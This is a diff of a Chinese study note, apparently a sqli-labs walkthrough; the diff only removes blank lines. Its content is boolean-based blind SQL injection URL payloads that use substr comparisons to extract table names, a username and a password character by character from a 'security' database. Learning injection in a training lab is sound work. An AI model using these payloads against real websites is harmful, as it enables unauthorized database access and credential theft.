@@ -56,7 +56,6 @@ category: 笔记
 表名
 
     ?id=1')) and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'--+
-    
     ?id=1')) and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1)='m'--+
     ...
 
@@ -96,7 +95,6 @@ category: 笔记
 第一个用户名
 
     ?id=1')) and (substr((select username from users limit 0,1),1,1))='d'--+
-
     ?id=1')) and (substr((select username from users limit 0,1),2,1))='u'--+
     ...
 得到第一个用户名`dumb`
@@ -108,7 +106,6 @@ category: 笔记
 第一个密码
 
     ?id=1')) and (substr((select password from users limit 0,1),1,1))='d'--+
-
     ?id=1')) and (substr((select password from users limit 0,1),2,1))='u'--+
     ...
 得到第一个密码`dumb`
